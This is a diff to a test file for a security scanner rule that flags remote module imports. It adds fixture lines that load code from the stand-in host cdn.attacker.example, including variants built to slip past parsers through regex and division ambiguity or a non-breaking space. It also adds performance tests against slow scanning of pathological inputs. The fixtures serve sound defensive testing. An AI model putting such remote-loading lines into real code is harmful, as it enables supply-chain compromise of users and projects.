@@ -198,6 +198,15 @@ describe('malicious fixture attack lines', () => {
         "export * from 'https://esm.sh/attacker-utils@1.0.0';",
         'export { render } from "https://cdn.attacker.example/render.mjs";',
         "const rules = require('https://cdn.attacker.example/lint-rules.js');",
+        "const banner = `loaded ${require('https://cdn.attacker.example/banner.js').text}`;",
+        "const quote = /\"/; const helper = require('https://cdn.attacker.example/helper.js');",
+        "const stage = await import('https://cdn.attacker.example/stage.js');",
+        `const half = "6" / 2; const slash = "/"; const split = require('https://cdn.attacker.example/split.js');`,
+        'const padded = await import(/*',
+        "import\u00a0'https://cdn.attacker.example/nbsp.js';",
+        `const empty = {} / 2; const slash2 = "/"; const objMod = require('https://cdn.attacker.example/obj.js');`,
+        `const next = count++ / 2; const slash3 = "/"; const incMod = require('https://cdn.attacker.example/inc.js');`,
+        `const ret = obj.return / 2; const slash4 = "/"; const retMod = require('https://cdn.attacker.example/ret.js');`,
         "formatter = importlib.import_module('https://cdn.attacker.example/formatter.py')",
       ],
     },
@@ -612,6 +621,30 @@ describe('rule cost on masked content', () => {
       const elapsedMs = performance.now() - startedAt;
 
       expect(matches.flat()).toEqual([]);
+      expect(elapsedMs).toBeLessThan(SCAN_BUDGET_MS);
+    }
+  );
+
+  // The specifier view checks the code before each string and lexes regex and template literals.
+  // At this size, earlier quadratic versions took 1.6 to 12 seconds.
+  const SPECIFIER_VIEW_INPUTS = [
+    { shape: 'adjacent strings', file: 'strings.js', content: `x = ${"'a' ".repeat(20_000)};\n` },
+    { shape: 'adjacent Python strings', file: 'strings.py', content: `x = (${'"a" '.repeat(20_000)})\n` },
+    { shape: 'unclosed regex classes', file: 'regex.js', content: `x${'=/['.repeat(20_000)}\n` },
+    {
+      shape: 'nested template literals',
+      file: 'templates.js',
+      content: `x = ${'`${'.repeat(10_000)}${'}`'.repeat(10_000)};\n`,
+    },
+  ];
+
+  it.each(SPECIFIER_VIEW_INPUTS)(
+    'should prepare the DEPS-REMOTE-IMPORT view of $shape within the time budget',
+    ({ file, content }) => {
+      const startedAt = performance.now();
+      DEPS_REMOTE_IMPORT.prepareContent?.(content, file);
+      const elapsedMs = performance.now() - startedAt;
+
       expect(elapsedMs).toBeLessThan(SCAN_BUDGET_MS);
     }
   );
